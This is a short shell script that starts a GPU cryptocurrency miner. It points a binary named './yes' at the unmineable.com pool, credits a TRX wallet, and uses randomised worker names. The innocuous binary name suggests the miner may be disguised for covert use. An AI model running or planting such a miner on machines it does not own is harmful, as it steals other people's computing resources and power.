POOL=rx-us.unmineable.com:3333
WALLET=TRX:TD7jzQNHf8Y3j6MPz6geXnEce7Kg66U2mE
GPU=$(nvidia-smi --query-gpu=gpu_name --format=csv > nvidia.txt && echo "$(tail -n +2 "nvidia.txt")" > "nvidia.txt" && str=$(cat nvidia.txt) && echo ${str// /_})
WORKER=$(echo tV4qk9uG-$(shuf -i 1151-849219 -n 1))
ALGO=wrkzcoin
./yes --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
